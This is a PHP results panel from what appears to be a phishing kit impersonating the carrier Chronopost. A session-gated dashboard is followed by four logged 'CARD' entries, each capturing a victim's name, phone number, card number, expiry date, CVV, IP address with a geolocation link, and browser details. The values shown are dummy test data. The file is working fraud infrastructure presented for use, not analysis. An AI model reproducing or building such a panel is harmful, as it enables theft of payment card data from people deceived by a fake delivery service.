<?php
error_reporting(0);
session_start();
$today = date("F j, Y, g:i a");        
if(!isset($_SESSION['dchlog']))  { 
          header("Location: ./index.php");
      }
if ($_GET['type'] == 'logout') {
	
	header('Location: ../index.php?udm_cat_path='.sha1(time()));
	session_destroy();
}
$nav = '
<!DOCTYPE html><html lang="en"><head><title>Rezulta Example</title>
<script charset="utf-8" src="dch.js" type="text/javascript"></script>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="bootstrap.min.css"></head><body><nav class="navbar navbar-inverse"><ul class="nav navbar-nav"><li><a href="#">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRpcc18Fhus9l4jrdRxYmDFB66Ote3lZUr2xDapK3eXCEm0yUlW" style=" width: 52px; "></a></li>
<li><a href="#">'.$today.'</a></li></ul><a href="./index.php?type=logout"><p class="navbar-text">Logout</p></a>
<a href="#"><p class="navbar-text"><body onload="startTime()">
<div id="txt" style="color: #ffffff;font-size: 15px;font-weight: 700;line-height: 55px;"></div></p></a>
</nav><div class="container"></div></body></html>';
echo $nav;
?>
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
		
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>chronopost [ CARD ]</h3>
		<td style='width: 400px;'><a target='_blank'>::1</a></td>
		<h3 style='text-align: center;background: #ff0000;margin: 0px;padding: 3px;font-size: 12px;'>chronopost [Sunday 15th of July 2018 04:43:51 AM]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Nom et Prenom</b></td>
				<td style='width: 400px;'>dsqdqsd qsdqsd</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>N° de Tel</b></td>
				<td style='width: 400px;'>+332 222 22222</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Numéro de carte</b></td>
				<td style='width: 400px;'>2222 2222 2222 2222</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date d'expiration</b></td>
				<td style='width: 400px;'>22/2222</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Cryptogramme Exp</b></td>
				<td style='width: 400px;'>222</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=::1' target='_blank'>::1</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>By DCH</b></td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
		
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>chronopost [ CARD ]</h3>
		<td style='width: 400px;'><a target='_blank'>::1</a></td>
		<h3 style='text-align: center;background: #ff0000;margin: 0px;padding: 3px;font-size: 12px;'>chronopost [Sunday 15th of July 2018 05:31:00 AM]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Nom et Prenom</b></td>
				<td style='width: 400px;'>cheronopost</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>N° de Tel</b></td>
				<td style='width: 400px;'>+330 000 00000</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Numéro de carte</b></td>
				<td style='width: 400px;'>0000 0000 0000 0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date d'expiration</b></td>
				<td style='width: 400px;'>00/0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Cryptogramme Exp</b></td>
				<td style='width: 400px;'></td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=::1' target='_blank'>::1</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>By DCH</b></td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
		
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>chronopost [ CARD ]</h3>
		<td style='width: 400px;'><a target='_blank'>::1</a></td>
		<h3 style='text-align: center;background: #ff0000;margin: 0px;padding: 3px;font-size: 12px;'>chronopost [Monday 16th of July 2018 11:34:39 AM]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Nom et Prenom</b></td>
				<td style='width: 400px;'>laila 9lawi</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>N° de Tel</b></td>
				<td style='width: 400px;'>+330 000 00000</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Numéro de carte</b></td>
				<td style='width: 400px;'>0000 0000 0000 0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date d'expiration</b></td>
				<td style='width: 400px;'>00/0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Cryptogramme Exp</b></td>
				<td style='width: 400px;'>000</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=::1' target='_blank'>::1</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>By DCH</b></td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
	<!DOCTYPE html>
	<html>
	<head>
		<meta charset='UTF-8' />
	</head>
	<body>
	<style type='text/css'>
	body{
		background: #fff;
		color: #fff;
		font-family: arial;
	}
	.rezlt{
		width: 600px;
		border: 1px solid #232f3e;
	}
	table{
		width: 100%;
	    background: #fff;
	    color: #444;
	}
	table td{
		padding: 10px;
	}
	.newline{
    width: 100%;
    background: #ff9900;
    height: 2px;
	}
	</style>
	<center>
		
	<div class='rezlt'>
		<h3 style='text-align: center;background: #232f3e;margin: 0px;padding: 17px;'>chronopost [ CARD ]</h3>
		<td style='width: 400px;'><a target='_blank'>::1</a></td>
		<h3 style='text-align: center;background: #ff0000;margin: 0px;padding: 3px;font-size: 12px;'>chronopost [Monday 16th of July 2018 06:06:22 PM]</h3>
		<table>
			<tr>
				<td style='width: 200px;'><b>Nom et Prenom</b></td>
				<td style='width: 400px;'>AAAAAAAAA AAAAA</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>N° de Tel</b></td>
				<td style='width: 400px;'>00 00 00 00 00</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>Numéro de carte</b></td>
				<td style='width: 400px;'>0000 0000 0000 0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Date d'expiration</b></td>
				<td style='width: 400px;'>00/0000</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Cryptogramme Exp</b></td>
				<td style='width: 400px;'>000</td>
			</tr>
		</table>
		<div class='newline'></div>
		<table>
			<tr>
				<td style='width: 200px;'><b>IP</b></td>
				<td style='width: 400px;'><a href='http://geoiptool.com/?ip=::1' target='_blank'>::1</a></td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>User Agent</b></td>
				<td style='width: 400px;'>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>Accept Language</b></td>
				<td style='width: 400px;'>fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</td>
			</tr>
			<tr>
				<td style='width: 200px;'><b>By DCH</b></td>
			</tr>
		</table>
	</div>
	</center>
	</body>
	</html>
